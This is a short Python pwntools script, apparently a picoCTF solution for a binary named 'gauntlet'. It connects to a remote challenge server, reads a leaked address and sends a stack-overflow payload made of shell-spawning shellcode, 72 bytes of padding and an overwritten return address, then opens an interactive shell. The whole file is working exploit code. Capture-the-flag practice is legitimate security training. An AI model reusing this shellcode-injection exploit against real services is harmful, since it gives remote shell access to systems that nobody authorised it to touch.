from pwn import *
binary = context.binary = ELF("../gauntlet",checksec=False)
HOST = "157.180.85.167" 
PORT = 20006

context.log_level = "error"


def main():
    # 128
    io = remote("wily-courier.picoctf.net",51757)
    l=io.recvline().strip().decode()
    print(l)
    io.sendline(b"1")
    padding = b'A'*(72)
    paylaod = flat(asm(shellcraft.sh()),padding,p64(int(l,16)))
    print(len(paylaod))
    io.sendline(paylaod)
    io.interactive()

if __name__ == "__main__":
    main()
